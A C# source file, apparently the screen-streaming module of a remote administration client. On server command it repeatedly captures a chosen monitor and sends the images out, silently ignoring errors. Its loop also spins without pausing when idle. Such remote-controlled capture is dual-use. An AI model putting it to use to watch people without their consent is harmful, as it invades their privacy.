using Client.Core.Helper;
using Client.Core.Networking;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Shared;
using Shared.Helper;
using Shared.Enums;
using Shared.Objects;

namespace Client.Core.Events
{
    class SubmitScreen
    {
        public static bool isSubmitting;
        public static int FramesPerSecond = 10;
        public static int CurrentMonitor;

        private static Thread submitThread = new Thread(SubmitThread);

        public static void Execute(string data)
        {
            if (!submitThread.IsAlive)
                submitThread.Start();

            SubmitScreenStatus submitObj = JsonConvert.DeserializeObject<SubmitScreenStatus>(data);
            switch (submitObj.Type)
            {
                case SubmitScreenStatusE.ChangeRefresh:
                    FramesPerSecond = submitObj.Refresh;
                    break;
                case SubmitScreenStatusE.StartSubmit:
                    if (!isSubmitting)
                    {
                        isSubmitting = true;
                        FramesPerSecond = submitObj.Refresh;
                        CurrentMonitor = submitObj.Monitor;
                    }
                    break;
                case SubmitScreenStatusE.StopSubmit:
                    if (isSubmitting)
                        isSubmitting = false;
                    break;
                case SubmitScreenStatusE.ChangeMonitor:
                    CurrentMonitor = submitObj.Monitor;
                    break;
            }
        }


        public static void SubmitThread()
        {
            while(true)
            {
                if(isSubmitting)
                {
                    try
                    {
                        NetworkManager.Connection.SendObject<byte[]>("ScreenshotSubmit", BitmapConvert.imageToByteArray(ScreenshotHelper.TakeScreenshot(CurrentMonitor)));
                    }
                    catch
                    {

                    }
                    Thread.Sleep((int)Math.Round(((1f / FramesPerSecond) * 1000)));
                }
            }
        }
    }
}
